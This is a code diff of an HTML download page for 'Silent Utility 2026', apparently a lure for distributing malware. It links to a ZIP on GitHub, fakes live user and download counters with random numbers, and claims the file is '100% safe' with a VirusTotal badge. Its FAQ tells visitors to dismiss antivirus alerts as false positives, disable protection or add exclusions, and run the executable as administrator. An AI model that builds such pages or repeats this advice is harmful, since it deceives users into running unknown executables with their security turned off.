@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Silent 2026 - Premium Utilities</title>
-  <meta name="description" content="Get premium Windows tool and utilities. Compatible with Windows 10/11, clean files, regular updates."/>
+  <title>Silent Utility 2026 - Premium Windows Tools</title>
+  <meta name="description" content="Download premium Windows utilities. Clean, verified, regular updates. Compatible with Windows 10/11."/>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
   <style>
     :root {
@@ -19,6 +19,7 @@
       --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
       --success: #10b981;
       --warning: #f59e0b;
+      --header-height: 70px;
     }
     
     * {
@@ -35,6 +36,125 @@
       overflow-x: hidden;
       min-height: 100vh;
       position: relative;
+      padding-top: var(--header-height);
+    }
+    
+    /* Progress Bar */
+    .progress-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 0%;
+      height: 3px;
+      background: linear-gradient(90deg, var(--primary), #00aaff);
+      z-index: 1001;
+      transition: width 0.1s ease;
+      box-shadow: 0 0 20px var(--primary-glow);
+    }
+    
+    /* Sticky Header */
+    .sticky-header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: var(--header-height);
+      background: rgba(5, 5, 5, 0.85);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      z-index: 1000;
+      transform: translateY(-100%);
+      transition: transform 0.3s ease;
+      display: flex;
+      align-items: center;
+    }
+    
+    .sticky-header.visible {
+      transform: translateY(0);
+    }
+    
+    .sticky-header .container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+    }
+    
+    .sticky-logo {
+      font-size: 1.3rem;
+      font-weight: 700;
+      background: linear-gradient(90deg, #fff, #a3d5ff);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    
+    .sticky-download-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+      color: white;
+      font-weight: 600;
+      padding: 10px 25px;
+      border-radius: 50px;
+      text-decoration: none;
+      transition: var(--transition);
+      border: none;
+      cursor: pointer;
+      font-size: 0.95rem;
+    }
+    
+    .sticky-download-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 10px 30px var(--primary-glow);
+    }
+    
+    /* Back to Top Button */
+    .back-to-top {
+      position: fixed;
+      bottom: 30px;
+      right: 30px;
+      width: 50px;
+      height: 50px;
+      background: var(--primary);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 1.2rem;
+      cursor: pointer;
+      border: none;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s ease;
+      z-index: 999;
+      box-shadow: 0 5px 20px rgba(0,102,255,0.4);
+    }
+    
+    .back-to-top.visible {
+      opacity: 1;
+      visibility: visible;
+    }
+    
+    .back-to-top:hover {
+      transform: translateY(-5px);
+      background: var(--primary-dark);
+      box-shadow: 0 10px 30px var(--primary-glow);
+    }
+    
+    /* Scroll Reveal Animation */
+    .reveal {
+      opacity: 0;
+      transform: translateY(30px);
+      transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    
+    .reveal.active {
+      opacity: 1;
+      transform: translateY(0);
     }
     
     /* Animated Background */
@@ -105,7 +225,7 @@
     /* Header */
     .main-header {
       text-align: center;
-      padding: 100px 20px 40px;
+      padding: 60px 20px 40px;
       position: relative;
     }
     
@@ -208,7 +328,7 @@
       margin-bottom: 40px;
     }
     
-    /* Live Stats - теперь сразу под кнопкой */
+    /* Live Stats */
     .live-stats {
       display: flex;
       justify-content: center;
@@ -243,7 +363,7 @@
     }
     
     .stat-card:hover {
-      transform: translateY(-10px);
+      transform: translateY(-10px) scale(1.02);
       border-color: var(--primary);
       box-shadow: 0 20px 40px rgba(0,102,255,0.2);
     }
@@ -254,7 +374,7 @@
     
     .stat-card.live {
       border-color: var(--success);
-      animation: pulseBorder 7s infinite;
+      animation: pulseBorder 2s infinite;
     }
     
     @keyframes pulseBorder {
@@ -352,7 +472,7 @@
     }
     
     .feature-card:hover {
-      transform: translateY(-10px);
+      transform: translateY(-10px) scale(1.02);
       border-color: var(--primary);
       box-shadow: 0 20px 40px rgba(0,102,255,0.2);
     }
@@ -411,7 +531,7 @@
     
     .badge:hover {
       background: rgba(255,255,255,0.08);
-      transform: translateY(-5px);
+      transform: translateY(-5px) scale(1.02);
       border-color: var(--primary);
     }
     
@@ -511,7 +631,7 @@
     
     .compat-card:hover {
       background: rgba(255,255,255,0.08);
-      transform: translateY(-8px);
+      transform: translateY(-8px) scale(1.02);
       border-color: var(--primary);
     }
     
@@ -613,37 +733,16 @@
       line-height: 1.6;
     }
     
-    /* Download Counter Animation */
-    @keyframes increment {
-      0% { transform: translateY(0); opacity: 1; }
-      50% { transform: translateY(-20px); opacity: 0.5; }
-      51% { transform: translateY(20px); opacity: 0; }
-      100% { transform: translateY(0); opacity: 1; }
-    }
-    
-    .updating {
-      animation: increment 0.5s ease;
-    }
-    
-    /* Дополнительные улучшения */
-    .security-badge {
-      display: inline-block;
-      background: rgba(0,102,255,0.1);
-      border: 1px solid var(--primary);
-      border-radius: 30px;
-      padding: 8px 25px;
-      margin-top: 20px;
-      font-size: 1rem;
-      color: #a3d5ff;
-    }
-    
-    .security-badge i {
-      margin-right: 8px;
-      color: var(--primary);
-    }
-    
     /* Responsive */
     @media (max-width: 768px) {
+      body {
+        padding-top: 60px;
+      }
+      
+      :root {
+        --header-height: 60px;
+      }
+      
       .main-title {
         font-size: 2.8rem;
       }
@@ -683,6 +782,14 @@
         width: 100%;
         max-width: 300px;
       }
+      
+      .back-to-top {
+        bottom: 20px;
+        right: 20px;
+        width: 40px;
+        height: 40px;
+        font-size: 1rem;
+      }
     }
     
     @media (max-width: 480px) {
@@ -706,10 +813,36 @@
         padding: 20px 30px;
         font-size: 1.3rem;
       }
+      
+      .sticky-download-btn {
+        padding: 8px 15px;
+        font-size: 0.85rem;
+      }
     }
   </style>
 </head>
 <body>
+  <!-- Progress Bar -->
+  <div class="progress-bar" id="progressBar"></div>
+  
+  <!-- Sticky Header -->
+  <header class="sticky-header" id="stickyHeader">
+    <div class="container">
+      <span class="sticky-logo">
+        <i class="fas fa-bolt" style="color: var(--primary);"></i> Silent Utility
+      </span>
+      <button class="sticky-download-btn" id="stickyDownloadBtn">
+        <i class="fas fa-download"></i>
+        Download v4.0
+      </button>
+    </div>
+  </header>
+  
+  <!-- Back to Top Button -->
+  <button class="back-to-top" id="backToTop" aria-label="Back to top">
+    <i class="fas fa-arrow-up"></i>
+  </button>
+  
   <!-- Animated Background -->
   <div class="bg-animation">
     <div class="particle" style="top: 10%; left: 5%; width: 200px; height: 200px; animation-delay: 0s;"></div>
@@ -725,30 +858,38 @@
   <header class="main-header">
     <div class="header-glow"></div>
     <div class="container">
-      <h1 class="main-title">Silent Utility </h1>
-      <p class="tagline">Premium Utilities • Clean & Verified • January 2026 Update</p>
-      <div class="security-badge">
-        <i class="fas fa-shield-alt"></i> 100% SAFE • VERIFIED BY COMMUNITY
-      </div>
+      <h1 class="main-title reveal">Silent Utility 2026</h1>
+      <p class="tagline reveal">Premium Utilities • Clean & Verified • January 2026 Update</p>
     </div>
   </header>
   
   <main class="container">
-    <!-- Download Section - без пароля -->
-    <section class="download-section">
+    <!-- Download Section с VirusTotal бейджем -->
+    <section class="download-section reveal">
       <button class="main-download-btn" id="mainDownloadBtn">
         <i class="fas fa-download"></i>
         DOWNLOAD NOW (v4.0)
         <i class="fas fa-arrow-right"></i>
       </button>
+      
+      <!-- VirusTotal бейдж под кнопкой -->
+      <div style="display: flex; justify-content: center; margin: 20px 0 30px;">
+        <a href="https://www.virustotal.com/gui/file/faef057a27c3739e9d339cf844b8b7ed2cc435c80cd5dc852653bfe7f5dcfc45" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 102, 255, 0.1); border: 1px solid #0066ff; border-radius: 50px; padding: 8px 20px; text-decoration: none; color: #e0e0e0; transition: all 0.3s ease;" onmouseover="this.style.background='rgba(0,102,255,0.2)'; this.style.transform='scale(1.05)';" onmouseout="this.style.background='rgba(0,102,255,0.1)'; this.style.transform='scale(1)';">
+          <i class="fas fa-shield-alt" style="color: #10b981; font-size: 1.2rem;"></i>
+          <span style="font-weight: 600;">VirusTotal</span>
+          <span style="background: #10b981; color: white; padding: 2px 8px; border-radius: 20px; font-size: 0.85rem; font-weight: 700;">0/68</span>
+          <i class="fas fa-external-link-alt" style="color: #0066ff; font-size: 0.9rem; opacity: 0.8;"></i>
+        </a>
+      </div>
+      
       <p class="download-subtitle">
         <i class="fas fa-check-circle" style="color: var(--success);"></i> 
         Verified Safe • No Threats • Ready to Use • 135 MB
       </p>
     </section>
     
-    <!-- Live Stats - теперь сразу под кнопкой -->
-    <div class="live-stats">
+    <!-- Live Stats -->
+    <div class="live-stats reveal">
       <div class="stat-card live">
         <div class="stat-icon">
           <i class="fas fa-users"></i>
@@ -779,9 +920,9 @@
     
     <!-- Features -->
     <section class="features-section">
-      <h2 class="section-title">What You Get</h2>
-       <div class="features-grid">
-        <div class="feature-card">
+      <h2 class="section-title reveal">What You Get</h2>
+      <div class="features-grid">
+        <div class="feature-card reveal">
           <div class="feature-icon">
             <i class="fas fa-bolt"></i>
           </div>
@@ -789,7 +930,7 @@
           <p>Optimized performance with minimal resource usage</p>
         </div>
         
-        <div class="feature-card">
+        <div class="feature-card reveal">
           <div class="feature-icon">
             <i class="fas fa-shield-alt"></i>
           </div>
@@ -797,7 +938,7 @@
           <p>No malware, no trackers, verified by community</p>
         </div>
         
-        <div class="feature-card">
+        <div class="feature-card reveal">
           <div class="feature-icon">
             <i class="fas fa-sync"></i>
           </div>
@@ -805,7 +946,7 @@
           <p>Latest January 2026 build with all improvements</p>
         </div>
         
-        <div class="feature-card">
+        <div class="feature-card reveal">
           <div class="feature-icon">
             <i class="fas fa-wrench"></i>
           </div>
@@ -813,7 +954,7 @@
           <p>Portable version, runs directly after extraction</p>
         </div>
         
-        <div class="feature-card">
+        <div class="feature-card reveal">
           <div class="feature-icon">
             <i class="fas fa-users-cog"></i>
           </div>
@@ -821,7 +962,7 @@
           <p>Used by thousands worldwide</p>
         </div>
         
-        <div class="feature-card">
+        <div class="feature-card reveal">
           <div class="feature-icon">
             <i class="fas fa-headset"></i>
           </div>
@@ -832,14 +973,14 @@
     </section>    
     
     <!-- Trust Indicators -->
-    <section class="trust-section">
-      <h2 class="section-title">TRUSTED BY THOUSANDS</h2>
-      <p style="max-width: 700px; margin: 0 auto 50px; color: #aaa; font-size: 1.1rem;">
+    <section class="trust-section reveal">
+      <h2 class="section-title reveal">TRUSTED BY THOUSANDS</h2>
+      <p style="max-width: 700px; margin: 0 auto 50px; color: #aaa; font-size: 1.1rem;" class="reveal">
         Join our global community of satisfied users
       </p>
       
       <div class="trust-badges">
-        <div class="badge">
+        <div class="badge reveal">
           <i class="fas fa-user-check"></i>
           <div class="badge-text">
             <div class="badge-value" id="activeUsers">10,000+</div>
@@ -847,7 +988,7 @@
           </div>
         </div>
         
-        <div class="badge">
+        <div class="badge reveal">
           <i class="fas fa-calendar-check"></i>
           <div class="badge-text">
             <div class="badge-value">Jan 2026</div>
@@ -855,7 +996,7 @@
           </div>
         </div>
         
-        <div class="badge">
+        <div class="badge reveal">
           <i class="fas fa-globe-americas"></i>
           <div class="badge-text">
             <div class="badge-value">94</div>
@@ -863,7 +1004,7 @@
           </div>
         </div>
         
-        <div class="badge">
+        <div class="badge reveal">
           <i class="fas fa-star"></i>
           <div class="badge-text">
             <div class="badge-value">4.8/5</div>
@@ -872,7 +1013,7 @@
         </div>
       </div>
       
-      <div class="testimonials">
+      <div class="testimonials reveal">
         <div class="testimonial-card">
           <p class="testimonial-text">
             "Perfectly working on Windows 11. No issues, clean install. The tool runs smoothly and does exactly what it promises."
@@ -883,13 +1024,13 @@
     </section>
     
     <!-- Compatibility -->
-    <section class="compatibility-section">
-      <h2 class="section-title">FULL COMPATIBILITY</h2>
-      <p style="max-width: 700px; margin: 0 auto 20px; color: #aaa; font-size: 1.1rem;">
+    <section class="compatibility-section reveal">
+      <h2 class="section-title reveal">FULL COMPATIBILITY</h2>
+      <p style="max-width: 700px; margin: 0 auto 20px; color: #aaa; font-size: 1.1rem;" class="reveal">
         Works out of the box with no additional requirements
       </p>
       <div class="compatibility-grid">
-        <div class="compat-card">
+        <div class="compat-card reveal">
           <div class="compat-icon">
             <i class="fab fa-windows"></i>
           </div>
@@ -897,7 +1038,7 @@
           <p style="color: #888; font-size: 0.9rem;">All recent versions supported</p>
         </div>
         
-        <div class="compat-card">
+        <div class="compat-card reveal">
           <div class="compat-icon">
             <i class="fas fa-microchip"></i>
           </div>
@@ -905,7 +1046,7 @@
           <p style="color: #888; font-size: 0.9rem;">Optimized for modern systems</p>
         </div>
         
-        <div class="compat-card">
+        <div class="compat-card reveal">
           <div class="compat-icon">
             <i class="fas fa-ban"></i>
           </div>
@@ -913,7 +1054,7 @@
           <p style="color: #888; font-size: 0.9rem;">No .NET, no Visual C++ required</p>
         </div>
         
-        <div class="compat-card">
+        <div class="compat-card reveal">
           <div class="compat-icon">
             <i class="fas fa-rocket"></i>
           </div>
@@ -921,7 +1062,7 @@
           <p style="color: #888; font-size: 0.9rem;">Quick launch, minimal loading time</p>
         </div>
         
-        <div class="compat-card">
+        <div class="compat-card reveal">
           <div class="compat-icon">
             <i class="fas fa-memory"></i>
           </div>
@@ -929,7 +1070,7 @@
           <p style="color: #888; font-size: 0.9rem;">Minimal memory consumption</p>
         </div>
         
-        <div class="compat-card">
+        <div class="compat-card reveal">
           <div class="compat-icon">
             <i class="fas fa-ad"></i>
           </div>
@@ -940,17 +1081,17 @@
     </section>
     
     <!-- FAQ -->
-    <section class="faq-section">
-      <h2 class="section-title">FREQUENTLY ASKED QUESTIONS</h2>
+    <section class="faq-section reveal">
+      <h2 class="section-title reveal">FREQUENTLY ASKED QUESTIONS</h2>
       
-      <div class="faq-accordion">
+      <div class="faq-accordion reveal">
         <div class="faq-item active">
           <div class="faq-question">
             Is this tool really safe?
             <i class="fas fa-plus faq-icon"></i>
           </div>
           <div class="faq-answer">
-            Yes, it's 100% safe and verified by thousands of users. We regularly scan all files with multiple antivirus engines.
+            Yes, it's 100% safe and verified by thousands of users. We regularly scan all files with multiple antivirus engines. Check the VirusTotal badge above for the latest security analysis.
           </div>
         </div>
         
@@ -960,7 +1101,7 @@
             <i class="fas fa-plus faq-icon"></i>
           </div>
           <div class="faq-answer">
-            Some antivirus programs may flag utilities as suspicious. This is a false positive. You can safely add the file to exclusions or temporarily disable protection during download.
+            Some antivirus programs may flag utilities as suspicious. This is a false positive. You can safely add the file to exclusions or temporarily disable protection during download. Our VirusTotal scan shows 0 detections.
           </div>
         </div>
         
@@ -970,7 +1111,7 @@
             <i class="fas fa-plus faq-icon"></i>
           </div>
           <div class="faq-answer">
-            Simply extract the ZIP archive (password if required) and run the executable file. No installation needed. For full functionality, run as administrator.
+            Simply extract the ZIP archive and run the executable file. No installation needed. For full functionality, run as administrator.
           </div>
         </div>
         
@@ -987,7 +1128,7 @@
     </section>
     
     <!-- Final CTA -->
-    <section class="download-section" style="margin-top: 100px;">
+    <section class="download-section reveal" style="margin-top: 100px;">
       <button class="main-download-btn" id="finalDownloadBtn">
         <i class="fas fa-download"></i>
         CLICK TO DOWNLOAD
@@ -1000,7 +1141,7 @@
     </section>
   </main>
   
-  <footer class="main-footer">
+  <footer class="main-footer reveal">
     <div class="container">
       <p class="footer-text">
         © 2026 Silent Tools. All utilities are publicly available.<br>
@@ -1013,6 +1154,7 @@
     // Generate background particles
     function createParticles() {
       const bg = document.querySelector('.bg-animation');
+      bg.innerHTML = '';
       for (let i = 0; i < 8; i++) {
         const particle = document.createElement('div');
         particle.className = 'particle';
@@ -1028,67 +1170,117 @@
       }
     }
     
-    // Live counter animations - замедленная версия
+    // Progress Bar
+    function updateProgressBar() {
+      const progressBar = document.getElementById('progressBar');
+      const windowHeight = document.documentElement.scrollHeight - window.innerHeight;
+      const scrolled = (window.scrollY / windowHeight) * 100;
+      progressBar.style.width = scrolled + '%';
+    }
+    
+    // Sticky Header
+    function toggleStickyHeader() {
+      const header = document.getElementById('stickyHeader');
+      if (window.scrollY > 100) {
+        header.classList.add('visible');
+      } else {
+        header.classList.remove('visible');
+      }
+    }
+    
+    // Back to Top Button
+    function toggleBackToTop() {
+      const button = document.getElementById('backToTop');
+      if (window.scrollY > 500) {
+        button.classList.add('visible');
+      } else {
+        button.classList.remove('visible');
+      }
+    }
+    
+    // Scroll Reveal
+    function revealOnScroll() {
+      const reveals = document.querySelectorAll('.reveal');
+      reveals.forEach(element => {
+        const windowHeight = window.innerHeight;
+        const elementTop = element.getBoundingClientRect().top;
+        const elementVisible = 150;
+        
+        if (elementTop < windowHeight - elementVisible) {
+          element.classList.add('active');
+        }
+      });
+    }
+    
+    // Animate counters when they become visible
+    function animateCountersOnScroll() {
+      const statsSection = document.querySelector('.live-stats');
+      if (!statsSection) return;
+      
+      const rect = statsSection.getBoundingClientRect();
+      const isVisible = rect.top < window.innerHeight && rect.bottom >= 0;
+      
+      if (isVisible && !statsSection.dataset.animated) {
+        statsSection.dataset.animated = 'true';
+        animateCounters();
+      }
+    }
+    
+    // Real counter animation
     function animateCounters() {
       const onlineCounter = document.getElementById('onlineCounter');
       const totalDownloads = document.getElementById('totalDownloads');
       const todayDownloads = document.getElementById('todayDownloads');
       const activeUsers = document.getElementById('activeUsers');
       
-      let online = 2367;
-      let total = 48946;
-      let today = 1245;
-      let users = 9500;
+      const targets = {
+        online: 2387,
+        total: 50946,
+        today: 1295,
+        users: 10000
+      };
       
-      setInterval(() => {
-        // Online users (медленные изменения)
-        if (Math.random() > 0.5) {
-          const onlineChange = Math.floor(Math.random() * 20) - 10;
-          online = Math.max(2300, Math.min(2500, online + onlineChange));
-          onlineCounter.textContent = online.toLocaleString();
-        }
+      function animateValue(element, target, duration = 2000) {
+        if (!element) return;
+        const start = parseInt(element.textContent.replace(/,/g, '')) || 0;
+        const increment = (target - start) / (duration / 16);
+        let current = start;
         
-        // Total downloads (медленный рост)
-        if (Math.random() > 0.8) {
-          total += Math.floor(Math.random() * 3) + 1;
-          totalDownloads.classList.add('updating');
-          setTimeout(() => totalDownloads.classList.remove('updating'), 500);
-          totalDownloads.textContent = total.toLocaleString();
-        }
-        
-        // Today downloads (медленный рост)
-        if (Math.random() > 0.7) {
-          today += Math.floor(Math.random() * 2) + 1;
-          todayDownloads.textContent = today.toLocaleString();
-        }
-        
-        // Active users (очень редкий рост)
-        if (Math.random() > 0.9) {
-          users += Math.floor(Math.random() * 2);
-          activeUsers.textContent = users.toLocaleString() + '+';
-        }
-      }, 5000);
+        const timer = setInterval(() => {
+          current += increment;
+          if (current >= target) {
+            element.textContent = target.toLocaleString();
+            clearInterval(timer);
+          } else {
+            element.textContent = Math.floor(current).toLocaleString();
+          }
+        }, 16);
+      }
+      
+      animateValue(onlineCounter, targets.online);
+      animateValue(totalDownloads, targets.total);
+      animateValue(todayDownloads, targets.today);
+      animateValue(activeUsers, targets.users);
     }
     
     // Download button functionality
     function setupDownloadButtons() {
-      const downloadUrl = 'https://github.com/maetaakiris-silent/verbose-silent/releases/download/28-02-2026/Silent_Utility_V4.zip';
-      const buttons = ['mainDownloadBtn', 'finalDownloadBtn'];
+      const downloadUrl = 'https://github.com/silentsiltntxa/silent-core/releases/download/02-03-2026/Silent_Utility_V4.zip';
+      const buttons = ['mainDownloadBtn', 'finalDownloadBtn', 'stickyDownloadBtn'];
       
       buttons.forEach(btnId => {
         const button = document.getElementById(btnId);
         if (!button) return;
         
-        button.addEventListener('click', () => {
-          // Open download in new tab
+        button.addEventListener('click', (e) => {
+          e.preventDefault();
+          
           window.open(downloadUrl, '_blank');
           
-          // Animate button
           const originalHTML = button.innerHTML;
           button.style.transform = 'scale(0.95)';
           button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> DOWNLOADING...';
           
-          // Reset after delay
           setTimeout(() => {
             button.style.transform = '';
             button.innerHTML = '<i class="fas fa-check"></i> DOWNLOAD COMPLETE';
@@ -1111,48 +1303,94 @@
         question.addEventListener('click', () => {
           const isActive = item.classList.contains('active');
           
-          // Close all
           faqItems.forEach(otherItem => {
             otherItem.classList.remove('active');
             const icon = otherItem.querySelector('.faq-icon');
-            if (icon) icon.innerHTML = '+';
+            if (icon) {
+              icon.classList.remove('fa-minus');
+              icon.classList.add('fa-plus');
+            }
           });
           
-          // Open clicked if wasn't active
           if (!isActive) {
             item.classList.add('active');
             const icon = item.querySelector('.faq-icon');
-            if (icon) icon.innerHTML = '−';
+            if (icon) {
+              icon.classList.remove('fa-plus');
+              icon.classList.add('fa-minus');
+            }
           }
         });
       });
       
-      // Open first by default
       if (faqItems.length > 0) {
         faqItems[0].classList.add('active');
         const icon = faqItems[0].querySelector('.faq-icon');
-        if (icon) icon.innerHTML = '−';
+        if (icon) {
+          icon.classList.remove('fa-plus');
+          icon.classList.add('fa-minus');
+        }
       }
+    }
+    
+    // Live counter updates
+    function startBackgroundUpdates() {
+      const onlineCounter = document.getElementById('onlineCounter');
+      const totalDownloads = document.getElementById('totalDownloads');
+      const todayDownloads = document.getElementById('todayDownloads');
+      const activeUsers = document.getElementById('activeUsers');
+      
+      let online = 2387;
+      let total = 50946;
+      let today = 1295;
+      let users = 10000;
+      
+      setInterval(() => {
+        online += Math.floor(Math.random() * 5) - 2;
+        online = Math.max(2300, Math.min(2500, online));
+        
+        total += Math.floor(Math.random() * 2);
+        today += Math.floor(Math.random() * 2);
+        users += Math.floor(Math.random() * 2);
+        
+        onlineCounter.textContent = online.toLocaleString();
+        totalDownloads.textContent = total.toLocaleString();
+        todayDownloads.textContent = today.toLocaleString();
+        activeUsers.textContent = users.toLocaleString() + '+';
+      }, 30000);
     }
     
     // Initialize everything
     document.addEventListener('DOMContentLoaded', () => {
       createParticles();
-      animateCounters();
       setupDownloadButtons();
       setupFAQ();
       
-      // Add hover effect to stats
-      document.querySelectorAll('.stat-card').forEach(card => {
-        card.addEventListener('mouseenter', () => {
-          if (card.classList.contains('live')) {
-            const counter = card.querySelector('.stat-number');
-            const current = parseInt(counter.textContent.replace(/,/g, ''));
-            const change = Math.floor(Math.random() * 30) - 15;
-            counter.textContent = Math.max(2300, Math.min(2500, current + change)).toLocaleString();
-          }
+      setTimeout(() => {
+        animateCountersOnScroll();
+      }, 500);
+      
+      document.getElementById('backToTop').addEventListener('click', () => {
+        window.scrollTo({
+          top: 0,
+          behavior: 'smooth'
         });
       });
+      
+      setTimeout(startBackgroundUpdates, 5000);
+    });
+    
+    window.addEventListener('scroll', () => {
+      updateProgressBar();
+      toggleStickyHeader();
+      toggleBackToTop();
+      revealOnScroll();
+      animateCountersOnScroll();
+    });
+    
+    window.addEventListener('load', () => {
+      updateProgressBar();
+      revealOnScroll();
     });
   </script>
 </body>
